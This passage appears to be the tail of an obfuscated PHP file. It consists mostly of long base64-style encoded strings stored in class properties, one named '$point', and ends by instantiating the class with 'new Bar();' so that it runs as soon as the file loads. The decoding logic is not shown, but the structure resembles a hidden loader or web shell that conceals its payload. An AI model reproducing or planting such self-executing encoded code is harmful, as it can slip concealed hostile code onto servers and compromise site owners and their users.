	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';
	 
	var $point = 'bZJvT9swEMbfI+07HFaEEylqCYMylD9vUBCo0rq1hTdlqkziKh6JHTk2JRr97ruE0q3AO/vunp+fu7Nj
	ixpiIEsCA2jsQ2O02xQscJ3lLJ3epdMFvZ7PfyyvJ7M5/eX5cOzDVy8ERzCOuhUrGx5+ORArVzQNNyib
	pj9v09l8QZfFb1R44NjuhX32u6IeG4yQy5H3H+xyMhnfpAsHXXaoP1vYfmLnxmjLQ9j0dg55VZvWxXrU
	aW6slsC0Zn3IB3p2EZxcMOpDh/B7goeN8KxQQKMHlbegZKak4c+m4tLGZAvpWyZJ1GRa1CbJVWYxbwZr
	LQwvpUtOj0/huzJwpazMiRfuKpR85G2u1rIbnJWZEUq6HLsSK3D5IDO6HPMWjo66G5Zeqhy7imMYncPL
	C+zHvo0+iZ19jAXB+b8BvK5rE66FRB9oKCtF9viZncOdnzdxCB9avafRSukKWK+NCYGKm0LlMalVY3BG
	QtbWgGlrHpNukAQkq/CMW3+Xxe9RCcw/sdLiNUkwP+zgyT31wk003I47GnarSWj4Fw==';
}

new Bar();
?>